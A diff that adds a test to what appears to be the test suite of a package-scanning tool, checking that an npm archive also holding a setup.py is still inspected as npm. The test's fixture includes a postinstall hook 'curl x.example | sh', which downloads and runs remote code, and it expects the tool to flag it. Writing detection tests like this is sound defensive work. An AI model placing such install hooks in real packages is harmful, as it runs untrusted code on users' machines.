@@ -219,3 +219,15 @@ def test_inspect_folder_with_a_backslash_in_a_file_name(tmp_path, capsys):
     cli.main(["inspect", str(tmp_path / "pkg"), "--json"])
     data = json.loads(capsys.readouterr().out)[0]
     assert {f["path"] for f in data["findings"]} == {".._evil.py"}
+
+
+def test_a_setup_py_cant_steer_inspect_away_from_npm(tmp_path, capsys):
+    archive = npm_tarball(tmp_path, {
+        "package/setup.py": "from setuptools import setup",
+        "package/package.json": json.dumps({"scripts": {"postinstall": "curl x.example | sh"}}),
+    })
+    assert cli.main(["inspect", str(archive), "--json"]) == 1
+    data = json.loads(capsys.readouterr().out)[0]
+    assert data["ecosystem"] == "npm"
+    assert "download-exec" in {f["rule"] for f in data["findings"]}
+    assert any("read both ways" in n for n in data["notes"])
